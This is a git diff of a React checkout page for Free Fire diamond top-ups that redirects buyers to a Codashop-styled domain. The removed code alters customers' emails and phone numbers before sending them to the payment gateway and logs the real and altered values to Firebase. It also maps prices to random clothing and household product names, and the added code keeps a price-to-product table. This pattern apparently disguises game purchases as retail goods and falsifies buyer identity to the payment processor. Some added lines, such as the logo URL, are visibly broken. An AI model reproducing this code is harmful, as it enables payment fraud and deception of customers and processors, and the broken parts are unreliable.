@@ -1,256 +1,28 @@
 import { useState, useEffect, useRef } from 'react';
 import { useSearchParams } from 'react-router-dom';
-import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from '../lib/firebase';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 
-// Helper functions for email & phone alteration before sending to payment gateway
-// Email: Modify strictly the LAST 3 characters in the email username, keeping domain as @gmail.com
-function transformEmail(email: string): string {
-  const parts = email.split('@');
-  let username = parts[0] || 'customer';
-  if (username.length < 3) {
-    username = username.padEnd(3, 'x');
-  }
-
-  const prefix = username.slice(0, -3);
-  const last3 = username.slice(-3);
-
-  const transformedLast3 = last3
-    .split('')
-    .map((ch) => {
-      const code = ch.charCodeAt(0);
-      if (code >= 65 && code <= 90) {
-        // Uppercase A-Z -> shift +1
-        return String.fromCharCode(((code - 65 + 1) % 26) + 65);
-      } else if (code >= 97 && code <= 122) {
-        // Lowercase a-z -> shift +1
-        return String.fromCharCode(((code - 97 + 1) % 26) + 97);
-      } else if (code >= 48 && code <= 57) {
-        // Digit 0-9 -> shift +1
-        return String.fromCharCode(((code - 48 + 1) % 10) + 48);
-      }
-      return 'x';
-    })
-    .join('');
-
-  const transformedUser = prefix + transformedLast3;
-  return `${transformedUser}@gmail.com`;
-}
-
-// Phone: Prepend 91, and modify strictly the LAST 3 digits in the 10-digit phone number
-function transformPhone(phone: string): string {
-  const clean = phone.replace(/[^0-9]/g, '');
-  const tenDigits = clean.length >= 10 ? clean.slice(-10) : clean.padStart(10, '9');
-
-  const prefix = tenDigits.slice(0, -3);
-  const last3 = tenDigits.slice(-3);
-
-  const transformedLast3 = last3
-    .split('')
-    .map((digit) => String((Number(digit) + 1) % 10))
-    .join('');
-
-  const transformedTen = prefix + transformedLast3;
-  return `91${transformedTen}`;
-}
-
-const PRODUCT_CATEGORIES: Record<string, string[]> = {
-  '395.50': ['Wall Mounted Bathroom Storage Shelf with Towel Rack'],
-  '490':    ['Korean Fashion Oversized Casual Cotton T-Shirt'],
-  '499':    ['Women Multi Coloured Floral Regular Fit Crop Top'],
-  '550':    [
-    'Women Multi Coloured Floral Regular Fit Crop Top',
-    'Black High Rise Skinny Fit Shapewear For Women',
-    'Drop Shoulder Sleeves Regular Fit Sweatshirt For Women',
-    'Portable Handheld Ring LED Light Photography Lamp'
-  ],
-  '750':    [
-    'Blue Stripes Relaxed Fit Shirt For Women',
-    'Nylon Blend Regular Fit Bra For Women',
-    'Solid Tube Bra For Women'
-  ],
-  '1000':   ['Men Slim Fit Denim Jacket Vintage Edition'],
-  '1100':   [
-    'White and Black Wide Leg Fit Casual Trouser With 2 Pocket For Women',
-    'Regular Fit Casual Trouser With 1 Pocket For Women',
-    'Light Blue Solid Flared Jeans For Women'
-  ],
-  '1400':   [
-    'Stripes Regular Fit Shirt For Men',
-    'Skinny Fit Jeans With 5 Pocket For Women',
-    'Striped Regular Fit T-Shirt For Infant Boys',
-    'Cute Bear Phone Charms & Keychain Pendant'
-  ],
-  '5500':   [
-    'Slim Fit Utility Pocket Trouser For Men',
-    'Mens Slim Solid Navy Formal Trousers',
-    'Solid Rayon Pant For Women',
-    'LED Selfie Ring Lamp with Phone Holder & Tripod',
-    'Cotton Blend Straight Fit Trouser for Women'
-  ],
-  '7500':   [
-    'Olive Slim Fit Utility Pocket Trouser For Men',
-    'Cotton Blend Regular Fit Shirt For Men',
-    'Cotton Blend Solid Pant For Women',
-    'Solid Plazzos For Women And Girls',
-    'Stylish Women Maroon Gown Dress'
-  ],
+const PRODUCT_NAMES: Record<string, string> = {
+  '550':  'Premium Glossy Stainless Steel Wall Mounted 4 Rod Towel Holder Rack',
+  '750':  'Korean Fashion T-Shirt for Boys and Men',
+  '1100': "Men's Casual Korean T-Shirt and Shorts Suit",
+  '1400': 'Custom Printed Premium Hoodie',
+  '5500': 'Vacuum Cleaner Sweeping Robot',
 };
-
-function getProductNameForPrice(price: string): string {
-  const items = PRODUCT_CATEGORIES[price];
-  if (items && items.length > 0) {
-    const randomIndex = Math.floor(Math.random() * items.length);
-    return items[randomIndex];
-  }
-  return 'Women Multi Coloured Floral Regular Fit Crop Top';
-}
 
 const CODASHOP_URL = 'https://www.codashop.online/';
 
-// Missing parameters error screen component with 2-second countdown & redirect
-function MissingParamsError() {
-  const [barWidth, setBarWidth] = useState('100%');
-
-  useEffect(() => {
-    const t1 = setTimeout(() => setBarWidth('0%'), 50);
-    const t2 = setTimeout(() => {
-      window.location.replace('/');
-    }, 2000);
-    return () => {
-      clearTimeout(t1);
-      clearTimeout(t2);
-    };
-  }, []);
-
-  return (
-    <div style={{
-      minHeight: '100vh',
-      background: '#f8fafc',
-      display: 'flex',
-      alignItems: 'center',
-      justifyContent: 'center',
-      padding: '20px',
-      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
-      boxSizing: 'border-box'
-    }}>
-      <div style={{
-        maxWidth: '460px',
-        width: '100%',
-        background: '#ffffff',
-        borderRadius: '16px',
-        border: '1px solid #e2e8f0',
-        boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04)',
-        padding: '32px 24px',
-        textAlign: 'center',
-        boxSizing: 'border-box'
-      }}>
-        <div style={{
-          width: '64px',
-          height: '64px',
-          background: '#fef2f2',
-          border: '2px solid #fee2e2',
-          borderRadius: '50%',
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center',
-          margin: '0 auto 20px',
-          fontSize: '28px'
-        }}>
-          ⚠️
-        </div>
-        
-        <h2 style={{
-          fontSize: '18px',
-          fontWeight: 800,
-          color: '#0f172a',
-          marginBottom: '12px',
-          textTransform: 'uppercase',
-          letterSpacing: '0.5px'
-        }}>
-          No Item Selected
-        </h2>
-
-        <p style={{
-          fontSize: '14px',
-          lineHeight: '1.6',
-          color: '#475569',
-          marginBottom: '24px',
-          fontWeight: 500
-        }}>
-          Your order was not. You have not selected any item. Please go back to home and select item for purchase.
-        </p>
-
-        <div style={{
-          background: '#f1f5f9',
-          borderRadius: '8px',
-          padding: '12px 16px',
-          fontSize: '12px',
-          color: '#64748b',
-          marginBottom: '20px'
-        }}>
-          <div>Redirecting to home page in 2 seconds...</div>
-          <div style={{
-            width: '100%',
-            height: '4px',
-            background: '#e2e8f0',
-            borderRadius: '2px',
-            marginTop: '8px',
-            overflow: 'hidden'
-          }}>
-            <div style={{
-              width: barWidth,
-              height: '100%',
-              background: '#ef4444',
-              transition: 'width 2s linear'
-            }} />
-          </div>
-        </div>
-
-        <a 
-          href="/" 
-          style={{
-            display: 'inline-block',
-            padding: '11px 24px',
-            background: '#0f172a',
-            color: '#ffffff',
-            borderRadius: '8px',
-            fontSize: '13px',
-            fontWeight: 700,
-            textDecoration: 'none',
-            letterSpacing: '0.5px'
-          }}
-        >
-          GO TO HOMEPAGE NOW
-        </a>
-      </div>
-    </div>
-  );
-}
-
 export default function GarenaCheckout() {
-  const [searchParams] = useSearchParams();
+  const [searchParams, setSearchParams] = useSearchParams();
 
-  const rawPkg   = searchParams.get('pkg');
+  const pkg      = searchParams.get('pkg')      || '';
   const diamonds = searchParams.get('diamonds') || '';
   const uid      = searchParams.get('uid')      || '';
   const nick     = searchParams.get('nick')     || '';
   const level    = searchParams.get('level')    || '';
   const status   = searchParams.get('status')   || '';
-
-  // Check if valid package or status parameters exist in the HTTP request
-  const hasValidParams = Boolean(rawPkg || diamonds || status);
-
-  const pkg = rawPkg || diamonds || '499';
-
-  // Save session info to local storage for success/failure screens
-  useEffect(() => {
-    if (nick) localStorage.setItem('ff_nick', nick);
-    if (diamonds) localStorage.setItem('ff_dia', diamonds);
-    if (rawPkg) localStorage.setItem('ff_price', rawPkg);
-    if (level) localStorage.setItem('ff_lvl', level);
-    if (uid) localStorage.setItem('ff_uid', uid);
-  }, [nick, diamonds, rawPkg, level, uid]);
+  const gid      = searchParams.get('gid')      || '';
 
   // Responsive state system
   const [vw, setVw] = useState(
@@ -266,17 +38,8 @@ export default function GarenaCheckout() {
   const isTablet  = vw >= 640 && vw < 1024;
   const isDesktop = vw >= 1024;
 
-  // Inject global CSS resets once & guarantee standard mobile viewport
+  // Inject global CSS resets once
   useEffect(() => {
-    try {
-      const viewportMeta = document.querySelector('meta[name="viewport"]');
-      if (viewportMeta) {
-        viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1.0');
-      }
-    } catch (e) {
-      // ignore
-    }
-
     const style = document.createElement('style');
     style.innerHTML = `
       *, *::before, *::after { box-sizing: border-box; }
@@ -287,34 +50,63 @@ export default function GarenaCheckout() {
     `;
     document.head.appendChild(style);
     return () => {
-      if (document.head.contains(style)) {
-        document.head.removeChild(style);
-      }
+      document.head.removeChild(style);
     };
   }, []);
 
-  // If parameters are missing in the request, render the error screen with 2-second redirect
-  if (!hasValidParams) {
-    return <MissingParamsError />;
-  }
+  // Guard: If both pkg and status are empty, send back to home
+  useEffect(() => {
+    if (!pkg && !status) {
+      window.location.replace('/');
+    }
+  }, [pkg, status]);
 
   const [form, setForm] = useState({ name: '', phone: '', email: '' });
   const [focusedField, setFocusedField] = useState<'name' | 'phone' | 'email' | null>(null);
+  const [isUpiHovered, setIsUpiHovered] = useState(false);
+  const [isAllHovered, setIsAllHovered] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [loadingMessage, setLoadingMessage] = useState('Connecting to Payment Gateway...');
   const [error, setError] = useState('');
   const [countdown, setCountdown] = useState(5);
   const [barWidth, setBarWidth] = useState('100%');
   const [showPayModal, setShowPayModal] = useState(false);
+  const [isSaved, setIsSaved] = useState(false);
 
-  // Success page auto-redirection countdown
+  // Fulfillment Logic: Save successful orders to Firestore
   useEffect(() => {
-    if (status === 'success') {
+    if (status === 'success' && gid && !isSaved) {
+      const saveOrder = async () => {
+        try {
+          await addDoc(collection(db, 'garena_checkout_orders'), {
+            uid,
+            nickname: nick,
+            level,
+            diamonds,
+            amount: pkg,
+            gid,
+            customerName: form.name || 'Garena User',
+            customerPhone: form.phone || '',
+            customerEmail: form.email || '',
+            status: 'Pending',
+            createdAt: serverTimestamp()
+          });
+          setIsSaved(true);
+        } catch (err) {
+          console.error("Error saving Garena order:", err);
+        }
+      };
+      saveOrder();
+    }
+  }, [status, gid, uid, nick, level, diamonds, pkg, form.name, form.phone, form.email, isSaved]);
+
+  // Success/Failure page auto-redirection countdown
+  useEffect(() => {
+    if (status === 'success' || status === 'failed') {
       const timer = setInterval(() => {
         setCountdown(c => {
           if (c <= 1) {
             clearInterval(timer);
-            window.location.href = 'https://www.codashop.online/?status=success';
+            window.location.href = `https://www.codashop.online/?status=${status}`;
           }
           return c - 1;
         });
@@ -323,37 +115,19 @@ export default function GarenaCheckout() {
     }
   }, [status]);
 
-  // Failure page auto-redirection & progress bar
+  // Failure page progress bar effect
   useEffect(() => {
     if (status === 'failed') {
       const t1 = setTimeout(() => setBarWidth('0%'), 50);
-      const t2 = setTimeout(() => {
-        window.location.href = 'https://www.codashop.online/?status=failed';
-      }, 2000);
-      return () => {
-        clearTimeout(t1);
-        clearTimeout(t2);
-      };
+      return () => clearTimeout(t1);
     }
   }, [status]);
 
-  // Fix: reset loading and handle incomplete payment when user navigates back
+  // Fix: reset loading when user navigates back from PayU
   useEffect(() => {
-    const checkPendingPayment = () => {
-      const pendingStr = sessionStorage.getItem('pendingPayment');
-      if (pendingStr) {
-        sessionStorage.removeItem('pendingPayment');
-        setError('Your previous payment was not completed. Please retry your payment.');
-        setLoading(false);
-      }
-    };
-
-    checkPendingPayment();
-
     const handlePageShow = (e: PageTransitionEvent) => {
       if ((e as any).persisted || document.visibilityState === 'visible') {
         setLoading(false);
-        checkPendingPayment();
       }
     };
     window.addEventListener('pageshow', handlePageShow);
@@ -387,12 +161,14 @@ export default function GarenaCheckout() {
       resetTimer();
     };
 
+    // Start initial 15 sec timer
     idleTimerRef.current = setTimeout(() => {
       if (!hasMovedRef.current) {
         redirectToSource();
       }
     }, IDLE_INITIAL);
 
+    // Listen for any user activity
     const events = ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll', 'click'];
     events.forEach(e => window.addEventListener(e, handleActivity, { passive: true }));
 
@@ -402,106 +178,60 @@ export default function GarenaCheckout() {
     };
   }, [status, loading, showPayModal]);
 
-  // Handle Payment Execution
-  const handlePay = async (mode: 'QR' | 'ALL' = 'ALL') => {
+  const handlePay = async () => {
     if (!form.name.trim() || !form.phone.trim() || !form.email.trim()) {
-      setError('Please fill in all fields (Name, Phone, Email).');
-      return;
+      setError('Please fill in all fields.'); return;
     }
     if (!/^\d{10}$/.test(form.phone)) {
-      setError('Please enter a valid 10-digit mobile number.');
-      return;
+      setError('Enter valid 10-digit number.'); return;
     }
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
-      setError('Please enter a valid email address.');
-      return;
+      setError('Enter valid email.'); return;
     }
 
-    // Ensure standard responsive mobile viewport
-    try {
-      const viewportMeta = document.querySelector('meta[name="viewport"]');
-      if (viewportMeta) {
-        viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
-      }
-    } catch (e) {
-      // ignore
-    }
-    
-    setShowPayModal(false);
-    setLoading(true);
-    setLoadingMessage('Connecting to Secure Payment Gateway…');
-    setError('');
+    setError(''); setLoading(true);
 
     try {
-      const alteredEmail = transformEmail(form.email.trim());
-      const alteredPhone = transformPhone(form.phone.trim());
-
-      const payload = {
-        amount: Number(pkg) || 0,
-        source: 'garena',
-        customerData: {
-          firstName: form.name.split(' ')[0] || form.name,
-          lastName: form.name.split(' ').slice(1).join(' ') || '',
-          email: alteredEmail,
-          phone: alteredPhone
-        }
-      };
-
-      // Save customer's original email, original phone, altered email, altered phone to Firebase
-      try {
-        await addDoc(collection(db, 'garena_checkout_orders'), {
-          uid: String(uid || '').replace(/[^0-9]/g, ''),
-          originalEmail: form.email.trim(),
-          originalPhone: form.phone.trim(),
-          alteredEmail,
-          alteredPhone,
-          customerName: form.name.trim(),
-          amount: pkg,
-          createdAt: serverTimestamp(),
-          status: 'initiated'
-        });
-      } catch (dbErr) {
-        console.error('Firebase order logging error:', dbErr);
-      }
-
       const res = await fetch('/api/payglocal/initiate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({
+          amount: pkg,
+          customerData: {
+            firstName: form.name,
+            phone: form.phone,
+            email: form.email
+          },
+          source: 'garena'
+        }),
       });
 
-      if (!res.ok) {
-        throw new Error('Payment gateway initialization failed. Please try again.');
-      }
-
       const data = await res.json();
-      
-      if (data.redirectUrl) {
-        sessionStorage.setItem('pendingPayment', JSON.stringify({
-          txnId: data.merchantTxnId,
-          gid: data.gid,
-          startedAt: Date.now()
-        }));
 
-        console.log("PayGlocal Browser Redirect URL:", data.redirectUrl);
-        window.location.href = data.redirectUrl;
-        return;
-      } else {
-        throw new Error('Could not get payment redirect URL');
+      if (!res.ok) {
+        throw new Error(data.error || 'Payment initiation failed');
       }
-    } catch (err: any) {
+
+      if (data.redirectUrl) {
+        window.location.href = data.redirectUrl;
+      } else {
+        throw new Error('Redirect URL not received from gateway');
+      }
+
+    } catch (e: any) {
+      setError(e.message || 'Something went wrong. Please try again.');
       setLoading(false);
-      setError(err?.message || 'Payment processing failed. Please try again.');
     }
   };
 
   // SUCCESS PAGE
   if (status === 'success') {
-    const savedNick   = localStorage.getItem('ff_nick')   || nick || 'Player';
-    const savedDia    = localStorage.getItem('ff_dia')    || diamonds || '';
-    const savedLvl    = localStorage.getItem('ff_lvl')    || level || '';
+    const savedNick  = localStorage.getItem('ff_nick')  || 'Player';
+    const savedDia   = localStorage.getItem('ff_dia')   || '';
+    const savedPrice = localStorage.getItem('ff_price') || pkg;
+    const savedLvl   = localStorage.getItem('ff_lvl')   || '';
     const savedAvatar = localStorage.getItem('ff_avatar_url') || '';
-    const savedUid    = localStorage.getItem('ff_uid')    || uid;
+    const savedUid   = localStorage.getItem('ff_uid')   || uid;
 
     return (
       <div style={{
@@ -524,12 +254,15 @@ export default function GarenaCheckout() {
           overflow: 'hidden',
           boxSizing: 'border-box'
         }}>
+          {/* Card top strip */}
           <div style={{
             height: 6,
             background: 'linear-gradient(90deg, #ee2c24, #ff6b35)'
           }} />
 
+          {/* Card inner padding */}
           <div style={{ padding: isMobile ? '28px 20px 24px' : '36px 28px 32px', boxSizing: 'border-box' }}>
+            {/* 1. Green check circle */}
             <div style={{
               width: 72,
               height: 72,
@@ -544,16 +277,34 @@ export default function GarenaCheckout() {
               <span style={{ fontSize: 34, color: '#16a34a', fontWeight: 900 }}>✓</span>
             </div>
 
+            {/* 2. Success Title */}
             <h2 style={{
-              fontSize: isMobile ? 20 : 22,
+              fontSize: isMobile ? 22 : 24,
               fontWeight: 900,
               color: '#111',
-              margin: '0 0 6px',
-              textAlign: 'center'
+              margin: '0 0 12px',
+              textAlign: 'center',
+              textTransform: 'uppercase',
+              fontFamily: 'var(--font-h)'
             }}>
-              Your order has been confirmed
+              Your order has been successfully placed!
             </h2>
 
+            {/* 3. Reference ID */}
+            {searchParams.get('gid') && (
+              <div style={{ textAlign: 'center', margin: '0 0 20px', background: '#f9fafb', padding: '12px', borderRadius: '8px', border: '1px dashed #ddd' }}>
+                <span style={{ fontSize: 11, color: '#999', display: 'block', textTransform: 'uppercase', marginBottom: 4 }}>Transaction Reference</span>
+                <span style={{ fontSize: 16, fontWeight: 900, color: '#111', fontFamily: 'monospace' }}>
+                  #{searchParams.get('gid')}
+                </span>
+                <div style={{ marginTop: 8, color: '#16a34a', fontSize: 11, fontWeight: 700 }}>
+                  <i className="fa fa-clock" style={{ marginRight: 4 }}></i>
+                  ESTIMATED DELIVERY: 5-30 MINUTES
+                </div>
+              </div>
+            )}
+
+            {/* 3. Diamonds line */}
             {savedDia && (
               <div style={{ textAlign: 'center', margin: '0 0 20px' }}>
                 <span style={{ fontSize: isMobile ? 24 : 28, fontWeight: 900, color: '#ee2c24' }}>
@@ -562,6 +313,7 @@ export default function GarenaCheckout() {
               </div>
             )}
 
+            {/* 4. Player info box */}
             <div style={{
               background: '#f9fafb',
               border: '1px solid #f0f0f0',
@@ -601,6 +353,7 @@ export default function GarenaCheckout() {
               </div>
             </div>
 
+            {/* 5. Countdown box */}
             <div style={{
               background: '#fff7f7',
               border: '1px solid #fee2e2',
@@ -614,8 +367,9 @@ export default function GarenaCheckout() {
               Redirecting in <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 16 }}>{countdown} seconds</span>…
             </div>
 
+            {/* 6. Footer line */}
             <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
-              🔒 Payment secured by Free Fire Store · Do not close this window
+              🔒 Payment secured · Do not close this window
             </div>
           </div>
         </div>
@@ -646,12 +400,15 @@ export default function GarenaCheckout() {
           overflow: 'hidden',
           boxSizing: 'border-box'
         }}>
+          {/* Card top strip */}
           <div style={{
             height: 6,
             background: 'linear-gradient(90deg, #ee2c24, #c0392b)'
           }} />
 
+          {/* Card inner padding */}
           <div style={{ padding: isMobile ? '28px 20px 24px' : '36px 28px 32px', boxSizing: 'border-box' }}>
+            {/* 1. Red X circle */}
             <div style={{
               width: 72,
               height: 72,
@@ -666,6 +423,7 @@ export default function GarenaCheckout() {
               <span style={{ fontSize: 30, color: '#dc2626', fontWeight: 900 }}>✕</span>
             </div>
 
+            {/* 2. "Payment could not be completed" */}
             <h2 style={{
               fontSize: 20,
               fontWeight: 900,
@@ -676,6 +434,7 @@ export default function GarenaCheckout() {
               Payment could not be completed
             </h2>
 
+            {/* 3. Message */}
             <p style={{
               fontSize: 13,
               color: '#888',
@@ -683,9 +442,10 @@ export default function GarenaCheckout() {
               margin: '0 0 24px',
               lineHeight: 1.6
             }}>
-              Your payment was cancelled or failed. No amount was deducted.
+              Your payment could not be processed. No amount has been deducted.
             </p>
 
+            {/* 4. Redirect notice box */}
             <div style={{
               background: '#f9fafb',
               border: '1px solid #f0f0f0',
@@ -697,7 +457,7 @@ export default function GarenaCheckout() {
               color: '#aaa',
               boxSizing: 'border-box'
             }}>
-              Taking you back in 2 seconds…
+              Taking you back in <span style={{ fontWeight: 800, color: '#ee2c24', fontSize: 16 }}>{countdown} seconds</span>…
               <div style={{
                 width: '100%',
                 height: 4,
@@ -710,11 +470,12 @@ export default function GarenaCheckout() {
                   width: barWidth,
                   height: '100%',
                   background: 'linear-gradient(90deg, #ee2c24, #c0392b)',
-                  transition: 'width 2s linear'
+                  transition: 'width 5s linear'
                 }} />
               </div>
             </div>
 
+            {/* 5. Footer */}
             <div style={{ textAlign: 'center', fontSize: 11, color: '#ccc' }}>
               🔒 Payment secured · Do not close this window
             </div>
@@ -756,57 +517,41 @@ export default function GarenaCheckout() {
       fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
       WebkitFontSmoothing: 'antialiased'
     }}>
-      {/* FULLSCREEN LOADING OVERLAY */}
       {loading && (
         <div
           style={{
-            position: 'fixed',
-            inset: 0,
-            zIndex: 999999,
-            background: 'rgba(10, 12, 16, 0.92)',
-            backdropFilter: 'blur(10px)',
-            WebkitBackdropFilter: 'blur(10px)',
-            display: 'flex',
-            flexDirection: 'column',
-            alignItems: 'center',
-            justifyContent: 'center',
-            gap: 20,
-            padding: 24,
-            textAlign: 'center'
+            position: 'fixed', inset: 0, zIndex: 9999,
+            background: 'rgba(5,7,10,0.88)',
+            backdropFilter: 'blur(8px)',
+            display: 'flex', flexDirection: 'column',
+            alignItems: 'center', justifyContent: 'center', gap: 28,
           }}
         >
-          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
-            <span className="store-monogram" aria-hidden="true">FS</span>
-            <span style={{ fontSize: 24, fontWeight: 900, color: '#ffffff', letterSpacing: '0.5px' }}>FREE FIRE STORE</span>
-          </div>
-
-          <div style={{ display: 'flex', gap: 10, marginTop: 8 }}>
+          <img
+            src="https://official.FF INDIA.com/ph/v1/assets/FF INDIA_logo_horizontal.svg"
+            alt="FF INDIA"
+            style={{ height: 36, objectFit: 'contain', opacity: 0.9 }}
+          />
+          <div style={{ display: 'flex', gap: 10 }}>
             {[0, 1, 2].map(i => (
               <div
                 key={i}
                 style={{
-                  width: 12,
-                  height: 12,
-                  borderRadius: '50%',
+                  width: 10, height: 10, borderRadius: '50%',
                   background: '#ee2c24',
-                  boxShadow: '0 0 12px rgba(238, 44, 36, 0.8)',
-                  animation: 'garena-bounce 1.2s ease-in-out infinite',
+                  animation: 'FF INDIA-bounce 1.2s ease-in-out infinite',
                   animationDelay: `${i * 0.2}s`,
                 }}
               />
             ))}
           </div>
-
-          <div style={{ fontSize: 16, color: '#ffffff', fontWeight: 800, letterSpacing: 0.3, marginTop: 4 }}>
-            {loadingMessage}
-          </div>
-          <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.6)', fontWeight: 500 }}>
-            Please do not refresh or close this window
+          <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.45)', fontWeight: 600, letterSpacing: 0.5 }}>
+            Redirecting to payment…
           </div>
           <style>{`
-            @keyframes garena-bounce {
+            @keyframes FF INDIA-bounce {
               0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-              40% { transform: scale(1.2); opacity: 1; }
+              40% { transform: scale(1.1); opacity: 1; }
             }
           `}</style>
         </div>
@@ -823,7 +568,7 @@ export default function GarenaCheckout() {
         boxShadow: '0 1px 3px rgba(0,0,0,0.06)',
       }}>
         <div style={{
-          maxWidth: 480,
+          maxWidth: isDesktop ? 1200 : '100%',
           margin: '0 auto',
           padding: isMobile ? '0 14px' : '0 24px',
           height: isMobile ? 50 : 56,
@@ -834,14 +579,30 @@ export default function GarenaCheckout() {
         }}>
           {/* Left: logo + divider + title */}
           <div style={{ display: 'flex', alignItems: 'center', gap: 0, minWidth: 0, flex: 1 }}>
-            <span className="store-monogram" aria-hidden="true">FS</span>
+            {/* Free Fire flame SVG */}
+            <svg
+              viewBox="0 0 34 36"
+              fill="none"
+              style={{
+                width: isMobile ? 24 : 30,
+                height: isMobile ? 26 : 32,
+                flexShrink: 0,
+                display: 'block',
+              }}
+            >
+              <g id="Union">
+            <path d="M19.5397 0.10298L19.6326 0.022157L19.8982 0L19.7826 0.195385L19.5734 0.229753L19.3184 0.505834L19.1692 0.425641L19.1335 0.516787L18.8325 0.540581L18.8448 0.620774L19.1335 0.655772L18.8911 0.724761L18.8565 0.828244L18.7168 0.81641L18.7058 0.920145L18.4166 0.931098V1.00097L18.2308 1.04679L18.0569 1.24155L17.9295 1.1611C17.9295 1.1611 17.8947 1.1611 17.8714 1.28838C17.2684 1.64168 16.0247 2.32664 14.7703 3.01758C13.7365 3.58698 12.6953 4.16043 11.9993 4.55566C11.9567 4.58208 11.9112 4.61072 11.8625 4.64133C11.2738 5.0112 10.2255 5.66994 8.52449 6.21303C10.1314 5.87985 10.7558 5.59868 11.6469 5.19752C12.079 5.00297 12.5738 4.7802 13.2737 4.50958C15.4158 3.68083 17.7672 3.77273 17.7672 3.77273L17.478 3.94646L17.5003 4.24496L17.6626 4.26837L17.7791 4.29128L17.9871 4.15356L17.9991 4.25691L18.1848 4.29128L18.3465 4.25691L18.5783 4.18856L18.7643 4.23098L18.7643 4.23098L18.7396 4.04894L18.8973 4.09993L19.0023 4.21839L19.1335 4.04894L19.4478 4.13606L19.1458 4.14172L19.1804 4.25691L18.6473 4.26837L18.6819 4.34869L18.3115 4.32603L18.2422 4.3604C18.2422 4.3604 18.3005 4.44147 18.2191 4.45255C17.9295 4.55566 17.7731 4.74638 17.7731 4.74638C20.4134 3.64105 23.6109 5.57412 23.6109 5.57412L23.8187 5.62498L23.8546 5.93669L23.9404 6.00631H24.1149L23.9927 6.19528L24.1149 6.33313V6.55721L23.9058 6.5061L23.7495 6.33313L23.8365 6.22939L23.7323 6.09267H23.4195L23.2638 5.98869L23.1416 5.97094L22.8634 5.83258L22.6374 5.86821L23.1416 5.97094L22.8634 5.83258L22.6374 5.86821L22.4292 5.67673L21.4904 5.69435L21.5431 5.78096L22.0121 5.81546L22.0818 5.93669H22.551L22.7937 6.12641L23.107 6.09267L23.2809 6.17815L23.6279 6.28139L23.4023 6.36787C23.4023 6.36787 23.8811 7.1017 26.8589 7.8004C31.1329 8.80112 34 6.95516 34 6.95516C33.2703 7.88638 32.3836 8.16221 32.3836 8.16221L31.7406 8.23208L31.6014 8.33519L31.3065 8.42193L30.4385 8.88798L30.2122 9.04283L30.1948 9.16318L30.1085 9.26742L30.0737 9.09507H29.8121L29.5699 9.16318L29.604 9.25017L29.5519 9.47388H29.3773L29.4655 9.33691L29.3773 9.26742L29.2742 9.09507L29.1182 9.11169L28.8052 9.38765L28.6141 9.33691L28.4918 9.37078L28.3188 9.45714L28.1452 9.52588L27.9192 9.45714L27.6927 9.5605L27.537 9.45714L27.1897 9.42201L27.1721 9.30204H26.9637L26.8067 9.38765L26.5986 9.52588L25.9041 9.5605L26.5464 9.68211L26.7728 9.71572L26.9288 9.52588L27.0854 9.50901L27.242 9.5605L27.5717 9.6991L27.7804 9.68211L27.9363 9.57724L28.058 9.63012L28.2145 9.71572L28.3772 9.80208C28.3772 9.80208 27.3808 9.94006 26.1071 10.0101C27.358 10.078 28.5379 10.9065 28.5379 10.9065C28.5379 10.9065 27.9131 10.6542 25.5978 10.8143C23.4676 10.9631 22.2721 10.4309 21.0773 9.89913C20.129 9.47709 19.1813 9.05525 17.7672 8.97409C13.5286 8.72936 11.7362 11.2349 11.7362 11.2349L11.579 11.5807L11.2405 11.6057L11.206 11.8123L11.1366 11.8384L11.1189 11.9071L10.8933 11.9937L10.902 12.0973L11.1189 12.1224L11.0758 12.261L11.0059 12.4072L11.3276 12.9697L10.9362 12.6326L10.7801 12.5545L10.511 12.4428L10.4241 12.5373L10.3543 12.7278L10.2415 12.9002L10.0767 12.8482C10.0767 12.8482 10.1113 13.3052 9.65914 13.3919C9.48551 13.5728 9.6509 13.677 9.6509 13.677L9.87674 13.694V13.8851L9.96406 13.901C9.96406 13.901 9.91172 13.9611 9.87674 14.0911C10.0416 14.1163 10.1193 14.0047 10.1193 14.0047L10.224 14.03C10.224 14.03 9.97242 14.5573 9.33825 14.7641C9.43342 14.8671 9.53773 14.8765 9.53773 14.8765C9.53773 14.8765 8.84297 15.2818 8.62588 15.7473C8.49585 16.2138 8.7042 16.1794 8.7042 16.1794C8.7042 16.1794 8.50383 16.4036 8.4866 16.0837C8.28724 15.9987 8.19194 16.2219 8.19194 16.2219C8.19194 16.2219 8.18231 16.2737 8.27825 16.3003C8.07826 16.4643 8.08739 16.6787 8.08739 16.6787L8.28724 16.6961C8.28724 16.6961 8.37342 16.9034 8.19194 16.9034C8.00945 16.9034 8.00057 16.9987 8.00057 16.9987V17.0931L8.096 17.1629L7.87587 17.3489C7.87587 17.3489 7.66752 18.1319 7.82999 19.582C8.40891 24.4364 13.0651 24.2304 13.0651 24.2304C13.0651 24.2304 17.6517 24.5978 19.7597 20.916C23.0032 15.1179 18.0454 13.8972 18.0454 13.8972C18.0454 13.8972 14.3855 13.0235 13.1807 14.3585C12.1089 15.5457 13.5514 16.9578 13.5514 16.9578C13.5514 16.9578 14.4087 17.5568 14.0145 18.5701C13.3594 20.253 11.5828 19.8334 11.5828 19.8334C11.5828 19.8334 8.80191 19.1686 9.45117 16.7523C10.3581 13.3735 14.7559 12.8164 14.7559 12.8164C14.7559 12.8164 19.4232 11.9764 22.2846 13.8868C23.5404 14.7256 25.6555 13.9906 25.6555 13.9906C25.044 14.5972 23.964 14.8053 23.9527 14.807C23.9532 14.807 23.9557 14.8065 23.9602 14.8058C24.0877 14.7838 25.8036 14.4876 28.0874 14.5433C30.3032 14.5964 31.6661 12.5633 